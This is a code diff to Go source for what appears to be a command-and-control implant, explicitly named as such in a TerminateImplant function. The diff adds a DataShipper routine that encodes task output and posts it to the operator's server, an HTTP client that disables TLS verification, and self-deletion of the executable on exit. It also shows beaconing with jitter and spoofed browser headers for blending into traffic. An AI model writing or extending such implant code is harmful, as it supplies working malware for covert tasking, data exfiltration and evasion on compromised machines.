@@ -1,4 +1,4 @@
-package main
+package agent_helper
 
 import (
 	crand "crypto/rand"
@@ -22,7 +22,7 @@ type CallbackInfo struct {
 	Callback_freq int
 	Jitter        int
 	SelfTerminate int
-	StartDelay	  int
+	StartDelay    int
 }
 
 type InitialInfo struct {
@@ -31,6 +31,22 @@ type InitialInfo struct {
 	Username      string `json:"username"`
 	Callback_freq int    `json:"callback_freq"`
 	Jitter        int    `json:"jitter"`
+}
+
+type ResultsCreate struct {
+	TaskingID float64 `json:"tasking_id"`
+	Session   string  `json:"session"`
+	Task      string  `json:"task"`
+	Args      string  `json:"args"`
+	Results   string  `json:"results"`
+}
+
+var CustomClient = &http.Client{
+	Transport: &http.Transport{
+		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
+		DisableKeepAlives: true,
+	},
+	Timeout: 10 * time.Second,
 }
 
 func GatherInfo() InitialInfo {
@@ -56,7 +72,7 @@ func GatherInfo() InitialInfo {
 func FetchTasking(serverAddr string, session string) (string, error) {
 	url := fmt.Sprintf("%s/tasks/%s", serverAddr, session)
 
-	resp, err := customClient.Get(url)
+	resp, err := CustomClient.Get(url)
 	if err != nil {
 		return "", err
 	}
@@ -78,7 +94,7 @@ func CheckIn(serverAddr string, session string) (int, error) {
 			return http.ErrUseLastResponse
 		},
 		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+			TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
 			DisableKeepAlives: true,
 		},
 		Timeout: 10 * time.Second,
@@ -122,7 +138,7 @@ func PostJson(url string, payload interface{}) (int, error) {
 	req.Header.Set("SEC-FETCH-SITE", "cross-site")
 	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36")
 
-	resp, err := customClient.Do(req)
+	resp, err := CustomClient.Do(req)
 
 	if err != nil {
 		return 0, err
@@ -132,4 +148,36 @@ func PostJson(url string, payload interface{}) (int, error) {
 	_, _ = io.ReadAll(resp.Body)
 
 	return resp.StatusCode, nil
+}
+
+func DataShipper(serverUrl string, taskData map[string]interface{}, results string) {
+	encodedOutput := EncodeToBaseHexString(results)
+	encodedArgs := EncodeToBaseHexString(taskData["args"].(string))
+
+	result := ResultsCreate{
+		TaskingID: taskData["id"].(float64),
+		Session:   taskData["session"].(string),
+		Task:      taskData["task"].(string),
+		Args:      encodedArgs,
+		Results:   encodedOutput,
+	}
+	_, _ = PostJson(serverUrl, result)
+
+}
+
+func TerminateImplant() {
+	exePath, err := os.Executable()
+	if err != nil {
+		os.Exit(3)
+	}
+
+	if _, err := os.Stat(exePath); err == nil {
+		err := os.Remove(exePath)
+		if err != nil {
+			os.Exit(2)
+		}
+		os.Exit(1)
+	}
+	// Nothing on disk, just memory
+	os.Exit(0)
 }
